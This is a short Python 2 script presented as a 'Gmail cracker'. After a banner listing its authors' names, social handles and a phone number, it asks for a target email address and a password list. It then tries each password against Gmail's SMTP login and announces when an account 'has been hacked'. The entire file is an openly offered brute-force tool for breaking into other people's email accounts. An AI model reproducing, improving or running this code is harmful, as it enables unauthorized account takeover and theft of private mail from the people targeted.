#!/usr/bin/python
'''create by Ha3MrX'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               create by Somi•maria                '
   print '================================================='
   print '―○―○―○―○―○―○―○―○―○―○ '
   print 'DEVOLPER 1                                '
   print '                 SOMI          '
   print 'DEVOLPER2                                              '
   print '                 MARIA                              '
   print 'FACEBOOK                              '
   print '           MARIA MALIK    '
   print '           SOMI AWAN    '
   print 'GITHUB     '
   print '           SOMI190   , '
   print 'INSTAGRAM '
   print '                   SOMIBRAN7D '
   print 'WHATAAP  '
   print '               03455453538  '
   print 'SNAPCHAT    '
   print '               SO MI  '
   print 'NOTE    '
   print '         DONT COPY  '
   print '  GMAIL CRACKER  '
   print '  REAL '
   print '   STAR '
   print '   YOUTUBE   '
   print '      REAL STAR  '
   print '    SOMMI RAPPER     '
   print '      THANK U SO MUCH ALL ' 
   print '―○―○―○―○―○―○―○―○―○―○           '

main()
print '[1] start the Gmail attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
